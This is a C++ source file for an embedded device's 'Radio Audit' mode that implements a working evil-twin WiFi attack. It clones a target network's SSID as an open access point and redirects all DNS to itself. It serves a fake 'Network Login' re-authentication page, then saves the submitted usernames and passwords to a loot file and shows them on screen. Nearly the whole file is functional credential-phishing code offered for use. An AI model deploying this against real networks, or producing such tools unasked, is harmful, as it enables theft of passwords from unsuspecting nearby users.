#include "EvilTwinActivity.h"

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)

#include <GfxRenderer.h>
#include <HalStorage.h>
#include <Logging.h>
#include <WiFi.h>

#include "MappedInputManager.h"
#include "components/UITheme.h"
#include "fontIds.h"

namespace {
constexpr const char* LOOT_DIR = "/.radioink/loot";
constexpr uint8_t AP_CHANNEL = 1;
constexpr int DNS_PORT = 53;
constexpr int AP_MAX_CLIENTS = 8;

// Generic "network re-authentication" captive-portal page.
const char* PORTAL_HTML =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>WiFi Login</title><style>body{font-family:sans-serif;background:#f2f2f2;margin:0;padding:36px}"
    ".c{max-width:360px;margin:auto;background:#fff;padding:24px;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.2)}"
    "h2{margin:0 0 4px}p{color:#555;font-size:14px}input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;"
    "border-radius:4px;box-sizing:border-box}button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;"
    "border-radius:4px;font-size:16px}</style></head><body><div class=c><h2>Network Login</h2>"
    "<p>Your WiFi network requires re-authentication to continue.</p>"
    "<form method=POST action=/login><input name=user placeholder='Email or username' autocomplete=username>"
    "<input name=pass type=password placeholder='WiFi / account password' autocomplete=current-password>"
    "<button type=submit>Connect</button></form></div></body></html>";

const char* DONE_HTML =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'></head>"
    "<body style='font-family:sans-serif;text-align:center;padding:40px'><h3>Connecting...</h3>"
    "<p>Please wait while your device reconnects.</p></body></html>";
}  // namespace

EvilTwinActivity::EvilTwinActivity(GfxRenderer& renderer, MappedInputManager& mappedInput, std::string ssid)
    : Activity("EvilTwin", renderer, mappedInput), targetSsid(std::move(ssid)) {}

void EvilTwinActivity::onEnter() {
  Activity::onEnter();
  Storage.ensureDirectoryExists("/.radioink");
  Storage.ensureDirectoryExists(LOOT_DIR);
  lootPath = std::string(LOOT_DIR) + "/portal-" + std::to_string(millis() / 1000) + ".txt";
  startPortal();
  requestUpdate();
}

void EvilTwinActivity::startPortal() {
  WiFi.mode(WIFI_AP);
  delay(100);
  apStarted = WiFi.softAP(targetSsid.c_str(), nullptr, AP_CHANNEL, false, AP_MAX_CLIENTS);  // open network
  if (!apStarted) {
    LOG_ERR("EVIL", "softAP failed for '%s'", targetSsid.c_str());
    return;
  }
  delay(100);
  const IPAddress ip = WiFi.softAPIP();
  char b[16];
  snprintf(b, sizeof(b), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
  apIp = b;

  // DNS: resolve every domain to us so any browser request hits the portal.
  dns.reset(new (std::nothrow) DNSServer());
  if (dns) {
    dns->setErrorReplyCode(DNSReplyCode::NoError);
    dns->start(DNS_PORT, "*", ip);
  }

  server.reset(new (std::nothrow) WebServer(80));
  if (server) {
    server->on("/login", HTTP_POST, [this] { handleSubmit(); });
    server->on("/", HTTP_ANY, [this] { servePortal(); });
    server->onNotFound([this] { servePortal(); });  // captive-portal catch-all
    server->begin();
  }
  LOG_DBG("EVIL", "Portal up: SSID='%s' IP=%s heap=%u", targetSsid.c_str(), apIp.c_str(),
          static_cast<unsigned>(ESP.getFreeHeap()));
}

void EvilTwinActivity::servePortal() {
  if (server) server->send(200, "text/html", PORTAL_HTML);
}

void EvilTwinActivity::handleSubmit() {
  if (!server) return;
  const String user = server->arg("user");
  const String pass = server->arg("pass");
  const String host = server->client().remoteIP().toString();
  saveCredential(user, pass, host);
  server->send(200, "text/html", DONE_HTML);
}

void EvilTwinActivity::saveCredential(const String& user, const String& pass, const String& host) {
  if (user.isEmpty() && pass.isEmpty()) return;
  char line[320];
  snprintf(line, sizeof(line), "t+%lus ssid=%s ip=%s user=%s pass=%s\n", millis() / 1000, targetSsid.c_str(),
           host.c_str(), user.c_str(), pass.c_str());
  lootBuffer += line;
  Storage.writeFile(lootPath.c_str(), String(lootBuffer.c_str()));  // small file: rewrite whole buffer
  capturedCount++;
  lastCapture = std::string(user.c_str()) + " / " + pass.c_str();
  LOG_INF("EVIL", "Captured credential from %s", host.c_str());
  requestUpdate();
}

void EvilTwinActivity::loop() {
  if (apStarted) {
    if (dns) dns->processNextRequest();
    if (server) server->handleClient();
  }
  if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
    finish();  // returns to the Radio Audit menu
    return;
  }
  const uint32_t now = millis();
  if (now - lastUiMs > 2000) {  // refresh client/capture counters
    lastUiMs = now;
    requestUpdate();
  }
}

void EvilTwinActivity::render(RenderLock&&) {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int x = metrics.contentSidePadding;

  const std::string subtitle = apStarted ? ("AP up - " + apIp) : std::string("AP failed");
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Evil Twin / Portal",
                 subtitle.c_str());

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, x, y,
                    renderer.truncatedText(UI_12_FONT_ID, (String("SSID: ") + targetSsid.c_str()).c_str(),
                                           pageWidth - x * 2)
                        .c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  const int clients = apStarted ? WiFi.softAPgetStationNum() : 0;
  renderer.drawText(UI_12_FONT_ID, x, y,
                    (String("Clients: ") + clients + "   Captured: " + capturedCount).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  if (!lastCapture.empty()) {
    renderer.drawText(SMALL_FONT_ID, x, y,
                      renderer.truncatedText(SMALL_FONT_ID, (String("Last: ") + lastCapture.c_str()).c_str(),
                                             pageWidth - x * 2)
                          .c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  }
  renderer.drawText(SMALL_FONT_ID, x, y,
                    renderer.truncatedText(SMALL_FONT_ID, lootPath.c_str(), pageWidth - x * 2).c_str());

  const auto labels = mappedInput.mapLabels("Stop", "", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void EvilTwinActivity::onExit() {
  Activity::onExit();
  if (server) {
    server->stop();
    server.reset();
  }
  if (dns) {
    dns->stop();
    dns.reset();
  }
  if (apStarted) {
    WiFi.softAPdisconnect(true);
    apStarted = false;
  }
  WiFi.mode(WIFI_OFF);
  delay(50);
}

#endif  // RADIO_AUDIT_ENABLE_ACTIVE
